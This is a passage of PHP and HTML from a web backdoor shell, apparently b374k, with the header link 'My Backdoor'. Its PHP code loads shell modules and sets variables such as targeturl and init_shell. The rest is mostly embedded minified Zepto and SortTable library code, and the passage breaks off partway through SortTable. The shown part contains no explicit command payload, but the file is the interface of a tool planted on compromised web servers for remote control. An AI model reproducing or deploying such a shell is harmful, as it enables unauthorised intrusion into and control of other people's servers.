					<span><a onclick="set_cookie('cwd', '');" href='<?php echo getSelf(); ?>'>My Backdoor</a></span>
					<img onclick='viewfileorfolder();' id='b374k' src='<?php echo get_resource('b374k');?>' />&nbsp;<span id='nav'><?php echo $nav; ?></span>
				</div>
				<!--header info end-->

				<!--menu start-->
				
				<!--menu end-->

			</div>
			<!--header end-->

			<!--content start-->
			<div id='content'>
				<!--server info start-->
				<!--server info end-->

				<?php
				foreach($GLOBALS['module_to_load'] as $value){
					$content = $GLOBALS['module'][$value]['content'];
					echo "<div class='menucontent' id='".$GLOBALS['module'][$value]['id']."'>".$content."</div>";
				}
				?>
			</div>
			<!--content end-->

		</div>
		<!--wrapper end-->
		<table id="overlay"><tr><td><div id="loading" ondblclick='loading_stop();'></div></td></tr></table>
		<form action='<?php echo getSelf(); ?>' method='post' id='form' target='_blank'></form>
		<!--script start-->
		<script type='text/javascript'>
			var targeturl = '<?php echo getSelf(); ?>';
			var module_to_load = '<?php echo implode(",", $GLOBALS['module_to_load']);?>';
			var win = <?php echo (is_win())?'true':'false';?>;
			var init_shell = true;
			/* Zepto v1.1.2 - zepto event ajax form ie - zeptojs.com/license */
			var Zepto=function(){function G(a){return a==null?String(a):z[A.call(a)]||"object"}function H(a){return G(a)=="function"}function I(a){return a!=null&&a==a.window}function J(a){return a!=null&&a.nodeType==a.DOCUMENT_NODE}function K(a){return G(a)=="object"}function L(a){return K(a)&&!I(a)&&Object.getPrototypeOf(a)==Object.prototype}function M(a){return a instanceof Array}function N(a){return typeof a.length=="number"}function O(a){return g.call(a,function(a){return a!=null})}function P(a){return a.length>0?c.fn.concat.apply([],a):a}function Q(a){return a.replace(/::/g,"/").replace(/([A-Z]+)([A-Z][a-z])/g,"$1_$2").replace(/([a-z\d])([A-Z])/g,"$1_$2").replace(/_/g,"-").toLowerCase()}function R(a){return a in j?j[a]:j[a]=new RegExp("(^|\\s)"+a+"(\\s|$)")}function S(a,b){return typeof b=="number"&&!k[Q(a)]?b+"px":b}function T(a){var b,c;return i[a]||(b=h.createElement(a),h.body.appendChild(b),c=getComputedStyle(b,"").getPropertyValue("display"),b.parentNode.removeChild(b),c=="none"&&(c="block"),i[a]=c),i[a]}function U(a){return"children"in a?f.call(a.children):c.map(a.childNodes,function(a){if(a.nodeType==1)return a})}function V(c,d,e){for(b in d)e&&(L(d[b])||M(d[b]))?(L(d[b])&&!L(c[b])&&(c[b]={}),M(d[b])&&!M(c[b])&&(c[b]=[]),V(c[b],d[b],e)):d[b]!==a&&(c[b]=d[b])}function W(a,b){return b==null?c(a):c(a).filter(b)}function X(a,b,c,d){return H(b)?b.call(a,c,d):b}function Y(a,b,c){c==null?a.removeAttribute(b):a.setAttribute(b,c)}function Z(b,c){var d=b.className,e=d&&d.baseVal!==a;if(c===a)return e?d.baseVal:d;e?d.baseVal=c:b.className=c}function $(a){var b;try{return a?a=="true"||(a=="false"?!1:a=="null"?null:!/^0/.test(a)&&!isNaN(b=Number(a))?b:/^[\[\{]/.test(a)?c.parseJSON(a):a):a}catch(d){return a}}function _(a,b){b(a);for(var c in a.childNodes)_(a.childNodes[c],b)}var a,b,c,d,e=[],f=e.slice,g=e.filter,h=window.document,i={},j={},k={"column-count":1,columns:1,"font-weight":1,"line-height":1,opacity:1,"z-index":1,zoom:1},l=/^\s*<(\w+|!)[^>]*>/,m=/^<(\w+)\s*\/?>(?:<\/\1>|)$/,n=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,o=/^(?:body|html)$/i,p=/([A-Z])/g,q=["val","css","html","text","data","width","height","offset"],r=["after","prepend","before","append"],s=h.createElement("table"),t=h.createElement("tr"),u={tr:h.createElement("tbody"),tbody:s,thead:s,tfoot:s,td:t,th:t,"*":h.createElement("div")},v=/complete|loaded|interactive/,w=/^\.([\w-]+)$/,x=/^#([\w-]*)$/,y=/^[\w-]*$/,z={},A=z.toString,B={},C,D,E=h.createElement("div"),F={tabindex:"tabIndex",readonly:"readOnly","for":"htmlFor","class":"className",maxlength:"maxLength",cellspacing:"cellSpacing",cellpadding:"cellPadding",rowspan:"rowSpan",colspan:"colSpan",usemap:"useMap",frameborder:"frameBorder",contenteditable:"contentEditable"};return B.matches=function(a,b){if(!b||!a||a.nodeType!==1)return!1;var c=a.webkitMatchesSelector||a.mozMatchesSelector||a.oMatchesSelector||a.matchesSelector;if(c)return c.call(a,b);var d,e=a.parentNode,f=!e;return f&&(e=E).appendChild(a),d=~B.qsa(e,b).indexOf(a),f&&E.removeChild(a),d},C=function(a){return a.replace(/-+(.)?/g,function(a,b){return b?b.toUpperCase():""})},D=function(a){return g.call(a,function(b,c){return a.indexOf(b)==c})},B.fragment=function(b,d,e){var g,i,j;return m.test(b)&&(g=c(h.createElement(RegExp.$1))),g||(b.replace&&(b=b.replace(n,"<$1></$2>")),d===a&&(d=l.test(b)&&RegExp.$1),d in u||(d="*"),j=u[d],j.innerHTML=""+b,g=c.each(f.call(j.childNodes),function(){j.removeChild(this)})),L(e)&&(i=c(g),c.each(e,function(a,b){q.indexOf(a)>-1?i[a](b):i.attr(a,b)})),g},B.Z=function(a,b){return a=a||[],a.__proto__=c.fn,a.selector=b||"",a},B.isZ=function(a){return a instanceof B.Z},B.init=function(b,d){var e;if(!b)return B.Z();if(typeof b=="string"){b=b.trim();if(b[0]=="<"&&l.test(b))e=B.fragment(b,RegExp.$1,d),b=null;else{if(d!==a)return c(d).find(b);e=B.qsa(h,b)}}else{if(H(b))return c(h).ready(b);if(B.isZ(b))return b;if(M(b))e=O(b);else if(K(b))e=[b],b=null;else if(l.test(b))e=B.fragment(b.trim(),RegExp.$1,d),b=null;else{if(d!==a)return c(d).find(b);e=B.qsa(h,b)}}return B.Z(e,b)},c=function(a,b){return B.init(a,b)},c.extend=function(a){var b,c=f.call(arguments,1);return typeof a=="boolean"&&(b=a,a=c.shift()),c.forEach(function(c){V(a,c,b)}),a},B.qsa=function(a,b){var c,d=b[0]=="#",e=!d&&b[0]==".",g=d||e?b.slice(1):b,h=y.test(g);return J(a)&&h&&d?(c=a.getElementById(g))?[c]:[]:a.nodeType!==1&&a.nodeType!==9?[]:f.call(h&&!d?e?a.getElementsByClassName(g):a.getElementsByTagName(b):a.querySelectorAll(b))},c.contains=function(a,b){return a!==b&&a.contains(b)},c.type=G,c.isFunction=H,c.isWindow=I,c.isArray=M,c.isPlainObject=L,c.isEmptyObject=function(a){var b;for(b in a)return!1;return!0},c.inArray=function(a,b,c){return e.indexOf.call(b,a,c)},c.camelCase=C,c.trim=function(a){return a==null?"":String.prototype.trim.call(a)},c.uuid=0,c.support={},c.expr={},c.map=function(a,b){var c,d=[],e,f;if(N(a))for(e=0;e<a.length;e++)c=b(a[e],e),c!=null&&d.push(c);else for(f in a)c=b(a[f],f),c!=null&&d.push(c);return P(d)},c.each=function(a,b){var c,d;if(N(a)){for(c=0;c<a.length;c++)if(b.call(a[c],c,a[c])===!1)return a}else for(d in a)if(b.call(a[d],d,a[d])===!1)return a;return a},c.grep=function(a,b){return g.call(a,b)},window.JSON&&(c.parseJSON=JSON.parse),c.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(a,b){z["[object "+b+"]"]=b.toLowerCase()}),c.fn={forEach:e.forEach,reduce:e.reduce,push:e.push,sort:e.sort,indexOf:e.indexOf,concat:e.concat,map:function(a){return c(c.map(this,function(b,c){return a.call(b,c,b)}))},slice:function(){return c(f.apply(this,arguments))},ready:function(a){return v.test(h.readyState)&&h.body?a(c):h.addEventListener("DOMContentLoaded",function(){a(c)},!1),this},get:function(b){return b===a?f.call(this):this[b>=0?b:b+this.length]},toArray:function(){return this.get()},size:function(){return this.length},remove:function(){return this.each(function(){this.parentNode!=null&&this.parentNode.removeChild(this)})},each:function(a){return e.every.call(this,function(b,c){return a.call(b,c,b)!==!1}),this},filter:function(a){return H(a)?this.not(this.not(a)):c(g.call(this,function(b){return B.matches(b,a)}))},add:function(a,b){return c(D(this.concat(c(a,b))))},is:function(a){return this.length>0&&B.matches(this[0],a)},not:function(b){var d=[];if(H(b)&&b.call!==a)this.each(function(a){b.call(this,a)||d.push(this)});else{var e=typeof b=="string"?this.filter(b):N(b)&&H(b.item)?f.call(b):c(b);this.forEach(function(a){e.indexOf(a)<0&&d.push(a)})}return c(d)},has:function(a){return this.filter(function(){return K(a)?c.contains(this,a):c(this).find(a).size()})},eq:function(a){return a===-1?this.slice(a):this.slice(a,+a+1)},first:function(){var a=this[0];return a&&!K(a)?a:c(a)},last:function(){var a=this[this.length-1];return a&&!K(a)?a:c(a)},find:function(a){var b,d=this;return typeof a=="object"?b=c(a).filter(function(){var a=this;return e.some.call(d,function(b){return c.contains(b,a)})}):this.length==1?b=c(B.qsa(this[0],a)):b=this.map(function(){return B.qsa(this,a)}),b},closest:function(a,b){var d=this[0],e=!1;typeof a=="object"&&(e=c(a));while(d&&!(e?e.indexOf(d)>=0:B.matches(d,a)))d=d!==b&&!J(d)&&d.parentNode;return c(d)},parents:function(a){var b=[],d=this;while(d.length>0)d=c.map(d,function(a){if((a=a.parentNode)&&!J(a)&&b.indexOf(a)<0)return b.push(a),a});return W(b,a)},parent:function(a){return W(D(this.pluck("parentNode")),a)},children:function(a){return W(this.map(function(){return U(this)}),a)},contents:function(){return this.map(function(){return f.call(this.childNodes)})},siblings:function(a){return W(this.map(function(a,b){return g.call(U(b.parentNode),function(a){return a!==b})}),a)},empty:function(){return this.each(function(){this.innerHTML=""})},pluck:function(a){return c.map(this,function(b){return b[a]})},show:function(){return this.each(function(){this.style.display=="none"&&(this.style.display=""),getComputedStyle(this,"").getPropertyValue("display")=="none"&&(this.style.display=T(this.nodeName))})},replaceWith:function(a){return this.before(a).remove()},wrap:function(a){var b=H(a);if(this[0]&&!b)var d=c(a).get(0),e=d.parentNode||this.length>1;return this.each(function(f){c(this).wrapAll(b?a.call(this,f):e?d.cloneNode(!0):d)})},wrapAll:function(a){if(this[0]){c(this[0]).before(a=c(a));var b;while((b=a.children()).length)a=b.first();c(a).append(this)}return this},wrapInner:function(a){var b=H(a);return this.each(function(d){var e=c(this),f=e.contents(),g=b?a.call(this,d):a;f.length?f.wrapAll(g):e.append(g)})},unwrap:function(){return this.parent().each(function(){c(this).replaceWith(c(this).children())}),this},clone:function(){return this.map(function(){return this.cloneNode(!0)})},hide:function(){return this.css("display","none")},toggle:function(b){return this.each(function(){var d=c(this);(b===a?d.css("display")=="none":b)?d.show():d.hide()})},prev:function(a){return c(this.pluck("previousElementSibling")).filter(a||"*")},next:function(a){return c(this.pluck("nextElementSibling")).filter(a||"*")},html:function(a){return arguments.length===0?this.length>0?this[0].innerHTML:null:this.each(function(b){var d=this.innerHTML;c(this).empty().append(X(this,a,b,d))})},text:function(b){return arguments.length===0?this.length>0?this[0].textContent:null:this.each(function(){this.textContent=b===a?"":""+b})},attr:function(c,d){var e;return typeof c=="string"&&d===a?this.length==0||this[0].nodeType!==1?a:c=="value"&&this[0].nodeName=="INPUT"?this.val():!(e=this[0].getAttribute(c))&&c in this[0]?this[0][c]:e:this.each(function(a){if(this.nodeType!==1)return;if(K(c))for(b in c)Y(this,b,c[b]);else Y(this,c,X(this,d,a,this.getAttribute(c)))})},removeAttr:function(a){return this.each(function(){this.nodeType===1&&Y(this,a)})},prop:function(b,c){return b=F[b]||b,c===a?this[0]&&this[0][b]:this.each(function(a){this[b]=X(this,c,a,this[b])})},data:function(b,c){var d=this.attr("data-"+b.replace(p,"-$1").toLowerCase(),c);return d!==null?$(d):a},val:function(a){return arguments.length===0?this[0]&&(this[0].multiple?c(this[0]).find("option").filter(function(){return this.selected}).pluck("value"):this[0].value):this.each(function(b){this.value=X(this,a,b,this.value)})},offset:function(a){if(a)return this.each(function(b){var d=c(this),e=X(this,a,b,d.offset()),f=d.offsetParent().offset(),g={top:e.top-f.top,left:e.left-f.left};d.css("position")=="static"&&(g.position="relative"),d.css(g)});if(this.length==0)return null;var b=this[0].getBoundingClientRect();return{left:b.left+window.pageXOffset,top:b.top+window.pageYOffset,width:Math.round(b.width),height:Math.round(b.height)}},css:function(a,d){if(arguments.length<2){var e=this[0],f=getComputedStyle(e,"");if(!e)return;if(typeof a=="string")return e.style[C(a)]||f.getPropertyValue(a);if(M(a)){var g={};return c.each(M(a)?a:[a],function(a,b){g[b]=e.style[C(b)]||f.getPropertyValue(b)}),g}}var h="";if(G(a)=="string")!d&&d!==0?this.each(function(){this.style.removeProperty(Q(a))}):h=Q(a)+":"+S(a,d);else for(b in a)!a[b]&&a[b]!==0?this.each(function(){this.style.removeProperty(Q(b))}):h+=Q(b)+":"+S(b,a[b])+";";return this.each(function(){this.style.cssText+=";"+h})},index:function(a){return a?this.indexOf(c(a)[0]):this.parent().children().indexOf(this[0])},hasClass:function(a){return a?e.some.call(this,function(a){return this.test(Z(a))},R(a)):!1},addClass:function(a){return a?this.each(function(b){d=[];var e=Z(this),f=X(this,a,b,e);f.split(/\s+/g).forEach(function(a){c(this).hasClass(a)||d.push(a)},this),d.length&&Z(this,e+(e?" ":"")+d.join(" "))}):this},removeClass:function(b){return this.each(function(c){if(b===a)return Z(this,"");d=Z(this),X(this,b,c,d).split(/\s+/g).forEach(function(a){d=d.replace(R(a)," ")}),Z(this,d.trim())})},toggleClass:function(b,d){return b?this.each(function(e){var f=c(this),g=X(this,b,e,Z(this));g.split(/\s+/g).forEach(function(b){(d===a?!f.hasClass(b):d)?f.addClass(b):f.removeClass(b)})}):this},scrollTop:function(b){if(!this.length)return;var c="scrollTop"in this[0];return b===a?c?this[0].scrollTop:this[0].pageYOffset:this.each(c?function(){this.scrollTop=b}:function(){this.scrollTo(this.scrollX,b)})},scrollLeft:function(b){if(!this.length)return;var c="scrollLeft"in this[0];return b===a?c?this[0].scrollLeft:this[0].pageXOffset:this.each(c?function(){this.scrollLeft=b}:function(){this.scrollTo(b,this.scrollY)})},position:function(){if(!this.length)return;var a=this[0],b=this.offsetParent(),d=this.offset(),e=o.test(b[0].nodeName)?{top:0,left:0}:b.offset();return d.top-=parseFloat(c(a).css("margin-top"))||0,d.left-=parseFloat(c(a).css("margin-left"))||0,e.top+=parseFloat(c(b[0]).css("border-top-width"))||0,e.left+=parseFloat(c(b[0]).css("border-left-width"))||0,{top:d.top-e.top,left:d.left-e.left}},offsetParent:function(){return this.map(function(){var a=this.offsetParent||h.body;while(a&&!o.test(a.nodeName)&&c(a).css("position")=="static")a=a.offsetParent;return a})}},c.fn.detach=c.fn.remove,["width","height"].forEach(function(b){var d=b.replace(/./,function(a){return a[0].toUpperCase()});c.fn[b]=function(e){var f,g=this[0];return e===a?I(g)?g["inner"+d]:J(g)?g.documentElement["scroll"+d]:(f=this.offset())&&f[b]:this.each(function(a){g=c(this),g.css(b,X(this,e,a,g[b]()))})}}),r.forEach(function(a,b){var d=b%2;c.fn[a]=function(){var a,e=c.map(arguments,function(b){return a=G(b),a=="object"||a=="array"||b==null?b:B.fragment(b)}),f,g=this.length>1;return e.length<1?this:this.each(function(a,h){f=d?h:h.parentNode,h=b==0?h.nextSibling:b==1?h.firstChild:b==2?h:null,e.forEach(function(a){if(g)a=a.cloneNode(!0);else if(!f)return c(a).remove();_(f.insertBefore(a,h),function(a){a.nodeName!=null&&a.nodeName.toUpperCase()==="SCRIPT"&&(!a.type||a.type==="text/javascript")&&!a.src&&window.eval.call(window,a.innerHTML)})})})},c.fn[d?a+"To":"insert"+(b?"Before":"After")]=function(b){return c(b)[a](this),this}}),B.Z.prototype=c.fn,B.uniq=D,B.deserializeValue=$,c.zepto=B,c}();window.Zepto=Zepto,window.$===undefined&&(window.$=Zepto),function(a){function m(a){return a._zid||(a._zid=c++)}function n(a,b,c,d){b=o(b);if(b.ns)var e=p(b.ns);return(h[m(a)]||[]).filter(function(a){return a&&(!b.e||a.e==b.e)&&(!b.ns||e.test(a.ns))&&(!c||m(a.fn)===m(c))&&(!d||a.sel==d)})}function o(a){var b=(""+a).split(".");return{e:b[0],ns:b.slice(1).sort().join(" ")}}function p(a){return new RegExp("(?:^| )"+a.replace(" "," .* ?")+"(?: |$)")}function q(a,b){return a.del&&!j&&a.e in k||!!b}function r(a){return l[a]||j&&k[a]||a}function s(b,c,e,f,g,i,j){var k=m(b),n=h[k]||(h[k]=[]);c.split(/\s/).forEach(function(c){if(c=="ready")return a(document).ready(e);var h=o(c);h.fn=e,h.sel=g,h.e in l&&(e=function(b){var c=b.relatedTarget;if(!c||c!==this&&!a.contains(this,c))return h.fn.apply(this,arguments)}),h.del=i;var k=i||e;h.proxy=function(a){a=y(a);if(a.isImmediatePropagationStopped())return;a.data=f;var c=k.apply(b,a._args==d?[a]:[a].concat(a._args));return c===!1&&(a.preventDefault(),a.stopPropagation()),c},h.i=n.length,n.push(h),"addEventListener"in b&&b.addEventListener(r(h.e),h.proxy,q(h,j))})}function t(a,b,c,d,e){var f=m(a);(b||"").split(/\s/).forEach(function(b){n(a,b,c,d).forEach(function(b){delete h[f][b.i],"removeEventListener"in a&&a.removeEventListener(r(b.e),b.proxy,q(b,e))})})}function y(b,c){if(c||!b.isDefaultPrevented){c||(c=b),a.each(x,function(a,d){var e=c[a];b[a]=function(){return this[d]=u,e&&e.apply(c,arguments)},b[d]=v});if(c.defaultPrevented!==d?c.defaultPrevented:"returnValue"in c?c.returnValue===!1:c.getPreventDefault&&c.getPreventDefault())b.isDefaultPrevented=u}return b}function z(a){var b,c={originalEvent:a};for(b in a)!w.test(b)&&a[b]!==d&&(c[b]=a[b]);return y(c,a)}var b=a.zepto.qsa,c=1,d,e=Array.prototype.slice,f=a.isFunction,g=function(a){return typeof a=="string"},h={},i={},j="onfocusin"in window,k={focus:"focusin",blur:"focusout"},l={mouseenter:"mouseover",mouseleave:"mouseout"};i.click=i.mousedown=i.mouseup=i.mousemove="MouseEvents",a.event={add:s,remove:t},a.proxy=function(b,c){if(f(b)){var d=function(){return b.apply(c,arguments)};return d._zid=m(b),d}if(g(c))return a.proxy(b[c],b);throw new TypeError("expected function")},a.fn.bind=function(a,b,c){return this.on(a,b,c)},a.fn.unbind=function(a,b){return this.off(a,b)},a.fn.one=function(a,b,c,d){return this.on(a,b,c,d,1)};var u=function(){return!0},v=function(){return!1},w=/^([A-Z]|returnValue$|layer[XY]$)/,x={preventDefault:"isDefaultPrevented",stopImmediatePropagation:"isImmediatePropagationStopped",stopPropagation:"isPropagationStopped"};a.fn.delegate=function(a,b,c){return this.on(b,a,c)},a.fn.undelegate=function(a,b,c){return this.off(b,a,c)},a.fn.live=function(b,c){return a(document.body).delegate(this.selector,b,c),this},a.fn.die=function(b,c){return a(document.body).undelegate(this.selector,b,c),this},a.fn.on=function(b,c,h,i,j){var k,l,m=this;if(b&&!g(b))return a.each(b,function(a,b){m.on(a,c,h,b,j)}),m;!g(c)&&!f(i)&&i!==!1&&(i=h,h=c,c=d);if(f(h)||h===!1)i=h,h=d;return i===!1&&(i=v),m.each(function(d,f){j&&(k=function(a){return t(f,a.type,i),i.apply(this,arguments)}),c&&(l=function(b){var d,g=a(b.target).closest(c,f).get(0);if(g&&g!==f)return d=a.extend(z(b),{currentTarget:g,liveFired:f}),(k||i).apply(g,[d].concat(e.call(arguments,1)))}),s(f,b,i,h,c,l||k)})},a.fn.off=function(b,c,e){var h=this;return b&&!g(b)?(a.each(b,function(a,b){h.off(a,c,b)}),h):(!g(c)&&!f(e)&&e!==!1&&(e=c,c=d),e===!1&&(e=v),h.each(function(){t(this,b,e,c)}))},a.fn.trigger=function(b,c){return b=g(b)||a.isPlainObject(b)?a.Event(b):y(b),b._args=c,this.each(function(){"dispatchEvent"in this?this.dispatchEvent(b):a(this).triggerHandler(b,c)})},a.fn.triggerHandler=function(b,c){var d,e;return this.each(function(f,h){d=z(g(b)?a.Event(b):b),d._args=c,d.target=h,a.each(n(h,b.type||b),function(a,b){e=b.proxy(d);if(d.isImmediatePropagationStopped())return!1})}),e},"focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select keydown keypress keyup error".split(" ").forEach(function(b){a.fn[b]=function(a){return a?this.bind(b,a):this.trigger(b)}}),["focus","blur"].forEach(function(b){a.fn[b]=function(a){return a?this.bind(b,a):this.each(function(){try{this[b]()}catch(a){}}),this}}),a.Event=function(a,b){g(a)||(b=a,a=b.type);var c=document.createEvent(i[a]||"Events"),d=!0;if(b)for(var e in b)e=="bubbles"?d=!!b[e]:c[e]=b[e];return c.initEvent(a,d,!0),y(c)}}(Zepto),function($){function triggerAndReturn(a,b,c){var d=$.Event(b);return $(a).trigger(d,c),!d.isDefaultPrevented()}function triggerGlobal(a,b,c,d){if(a.global)return triggerAndReturn(b||document,c,d)}function ajaxStart(a){a.global&&$.active++===0&&triggerGlobal(a,null,"ajaxStart")}function ajaxStop(a){a.global&&!--$.active&&triggerGlobal(a,null,"ajaxStop")}function ajaxBeforeSend(a,b){var c=b.context;if(b.beforeSend.call(c,a,b)===!1||triggerGlobal(b,c,"ajaxBeforeSend",[a,b])===!1)return!1;triggerGlobal(b,c,"ajaxSend",[a,b])}function ajaxSuccess(a,b,c,d){var e=c.context,f="success";c.success.call(e,a,f,b),d&&d.resolveWith(e,[a,f,b]),triggerGlobal(c,e,"ajaxSuccess",[b,c,a]),ajaxComplete(f,b,c)}function ajaxError(a,b,c,d,e){var f=d.context;d.error.call(f,c,b,a),e&&e.rejectWith(f,[c,b,a]),triggerGlobal(d,f,"ajaxError",[c,d,a||b]),ajaxComplete(b,c,d)}function ajaxComplete(a,b,c){var d=c.context;c.complete.call(d,b,a),triggerGlobal(c,d,"ajaxComplete",[b,c]),ajaxStop(c)}function empty(){}function mimeToDataType(a){return a&&(a=a.split(";",2)[0]),a&&(a==htmlType?"html":a==jsonType?"json":scriptTypeRE.test(a)?"script":xmlTypeRE.test(a)&&"xml")||"text"}function appendQuery(a,b){return b==""?a:(a+"&"+b).replace(/[&?]{1,2}/,"?")}function serializeData(a){a.processData&&a.data&&$.type(a.data)!="string"&&(a.data=$.param(a.data,a.traditional)),a.data&&(!a.type||a.type.toUpperCase()=="GET")&&(a.url=appendQuery(a.url,a.data),a.data=undefined)}function parseArguments(a,b,c,d){var e=!$.isFunction(b);return{url:a,data:e?b:undefined,success:e?$.isFunction(c)?c:undefined:b,dataType:e?d||c:c}}function serialize(a,b,c,d){var e,f=$.isArray(b),g=$.isPlainObject(b);$.each(b,function(b,h){e=$.type(h),d&&(b=c?d:d+"["+(g||e=="object"||e=="array"?b:"")+"]"),!d&&f?a.add(h.name,h.value):e=="array"||!c&&e=="object"?serialize(a,h,c,b):a.add(b,h)})}var jsonpID=0,document=window.document,key,name,rscript=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,scriptTypeRE=/^(?:text|application)\/javascript/i,xmlTypeRE=/^(?:text|application)\/xml/i,jsonType="application/json",htmlType="text/html",blankRE=/^\s*$/;$.active=0,$.ajaxJSONP=function(a,b){if("type"in a){var c=a.jsonpCallback,d=($.isFunction(c)?c():c)||"jsonp"+ ++jsonpID,e=document.createElement("script"),f=window[d],g,h=function(a){$(e).triggerHandler("error",a||"abort")},i={abort:h},j;return b&&b.promise(i),$(e).on("load error",function(c,h){clearTimeout(j),$(e).off().remove(),c.type=="error"||!g?ajaxError(null,h||"error",i,a,b):ajaxSuccess(g[0],i,a,b),window[d]=f,g&&$.isFunction(f)&&f(g[0]),f=g=undefined}),ajaxBeforeSend(i,a)===!1?(h("abort"),i):(window[d]=function(){g=arguments},e.src=a.url.replace(/=\?/,"="+d),document.head.appendChild(e),a.timeout>0&&(j=setTimeout(function(){h("timeout")},a.timeout)),i)}return $.ajax(a)},$.ajaxSettings={type:"GET",beforeSend:empty,success:empty,error:empty,complete:empty,context:null,global:!0,xhr:function(){return new window.XMLHttpRequest},accepts:{script:"text/javascript, application/javascript, application/x-javascript",json:jsonType,xml:"application/xml, text/xml",html:htmlType,text:"text/plain"},crossDomain:!1,timeout:0,processData:!0,cache:!0},$.ajax=function(options){var settings=$.extend({},options||{}),deferred=$.Deferred&&$.Deferred();for(key in $.ajaxSettings)settings[key]===undefined&&(settings[key]=$.ajaxSettings[key]);ajaxStart(settings),settings.crossDomain||(settings.crossDomain=/^([\w-]+:)?\/\/([^\/]+)/.test(settings.url)&&RegExp.$2!=window.location.host),settings.url||(settings.url=window.location.toString()),serializeData(settings),settings.cache===!1&&(settings.url=appendQuery(settings.url,"_="+Date.now()));var dataType=settings.dataType,hasPlaceholder=/=\?/.test(settings.url);if(dataType=="jsonp"||hasPlaceholder)return hasPlaceholder||(settings.url=appendQuery(settings.url,settings.jsonp?settings.jsonp+"=?":settings.jsonp===!1?"":"callback=?")),$.ajaxJSONP(settings,deferred);var mime=settings.accepts[dataType],headers={},setHeader=function(a,b){headers[a.toLowerCase()]=[a,b]},protocol=/^([\w-]+:)\/\//.test(settings.url)?RegExp.$1:window.location.protocol,xhr=settings.xhr(),nativeSetHeader=xhr.setRequestHeader,abortTimeout;deferred&&deferred.promise(xhr),settings.crossDomain||setHeader("X-Requested-With","XMLHttpRequest"),setHeader("Accept",mime||"*/*");if(mime=settings.mimeType||mime)mime.indexOf(",")>-1&&(mime=mime.split(",",2)[0]),xhr.overrideMimeType&&xhr.overrideMimeType(mime);(settings.contentType||settings.contentType!==!1&&settings.data&&settings.type.toUpperCase()!="GET")&&setHeader("Content-Type",settings.contentType||"application/x-www-form-urlencoded");if(settings.headers)for(name in settings.headers)setHeader(name,settings.headers[name]);xhr.setRequestHeader=setHeader,xhr.onreadystatechange=function(){if(xhr.readyState==4){xhr.onreadystatechange=empty,clearTimeout(abortTimeout);var result,error=!1;if(xhr.status>=200&&xhr.status<300||xhr.status==304||xhr.status==0&&protocol=="file:"){dataType=dataType||mimeToDataType(settings.mimeType||xhr.getResponseHeader("content-type")),result=xhr.responseText;try{dataType=="script"?(1,eval)(result):dataType=="xml"?result=xhr.responseXML:dataType=="json"&&(result=blankRE.test(result)?null:$.parseJSON(result))}catch(e){error=e}error?ajaxError(error,"parsererror",xhr,settings,deferred):ajaxSuccess(result,xhr,settings,deferred)}else ajaxError(xhr.statusText||null,xhr.status?"error":"abort",xhr,settings,deferred)}};if(ajaxBeforeSend(xhr,settings)===!1)return xhr.abort(),ajaxError(null,"abort",xhr,settings,deferred),xhr;if(settings.xhrFields)for(name in settings.xhrFields)xhr[name]=settings.xhrFields[name];var async="async"in settings?settings.async:!0;xhr.open(settings.type,settings.url,async,settings.username,settings.password);for(name in headers)nativeSetHeader.apply(xhr,headers[name]);return settings.timeout>0&&(abortTimeout=setTimeout(function(){xhr.onreadystatechange=empty,xhr.abort(),ajaxError(null,"timeout",xhr,settings,deferred)},settings.timeout)),xhr.send(settings.data?settings.data:null),xhr},$.get=function(a,b,c,d){return $.ajax(parseArguments.apply(null,arguments))},$.post=function(a,b,c,d){var e=parseArguments.apply(null,arguments);return e.type="POST",$.ajax(e)},$.getJSON=function(a,b,c){var d=parseArguments.apply(null,arguments);return d.dataType="json",$.ajax(d)},$.fn.load=function(a,b,c){if(!this.length)return this;var d=this,e=a.split(/\s/),f,g=parseArguments(a,b,c),h=g.success;return e.length>1&&(g.url=e[0],f=e[1]),g.success=function(a){d.html(f?$("<div>").html(a.replace(rscript,"")).find(f):a),h&&h.apply(d,arguments)},$.ajax(g),this};var escape=encodeURIComponent;$.param=function(a,b){var c=[];return c.add=function(a,b){this.push(escape(a)+"="+escape(b))},serialize(c,a,b),c.join("&").replace(/ /g,"+")}}(Zepto),function(a){a.fn.serializeArray=function(){var b=[],c;return a([].slice.call(this.get(0).elements)).each(function(){c=a(this);var d=c.attr("type");this.nodeName.toLowerCase()!="fieldset"&&!this.disabled&&d!="submit"&&d!="reset"&&d!="button"&&(d!="radio"&&d!="checkbox"||this.checked)&&b.push({name:c.attr("name"),value:c.val()})}),b},a.fn.serialize=function(){var a=[];return this.serializeArray().forEach(function(b){a.push(encodeURIComponent(b.name)+"="+encodeURIComponent(b.value))}),a.join("&")},a.fn.submit=function(b){if(b)this.bind("submit",b);else if(this.length){var c=a.Event("submit");this.eq(0).trigger(c),c.isDefaultPrevented()||this.get(0).submit()}return this}}(Zepto),function(a){"__proto__"in{}||a.extend(a.zepto,{Z:function(b,c){return b=b||[],a.extend(b,a.fn),b.selector=c||"",b.__Z=!0,b},isZ:function(b){return a.type(b)==="array"&&"__Z"in b}});try{getComputedStyle(undefined)}catch(b){var c=getComputedStyle;window.getComputedStyle=function(a){try{return c(a)}catch(b){return null}}}}(Zepto)


/**
*
* SortTable
* version 2
* 7th April 2007
* Stuart Langridge, http://www.kryogenix.org/code/browser/sorttable/
*
**/
var h=!0,j=!1;
sorttable={e:function(){arguments.callee.i||(arguments.callee.i=h,k&&clearInterval(k),document.createElement&&document.getElementsByTagName&&(sorttable.a=/^(\d\d?)[\/\.-](\d\d?)[\/\.-]((\d\d)?\d\d)$/,l(document.getElementsByTagName("table"),function(a){-1!=a.className.search(/\bsortable\b/)&&sorttable.k(a)})))},k:function(a){0==a.getElementsByTagName("thead").length&&(the=document.createElement("thead"),the.appendChild(a.rows[0]),a.insertBefore(the,a.firstChild));null==a.tHead&&(a.tHead=a.getElementsByTagName("thead")[0]);
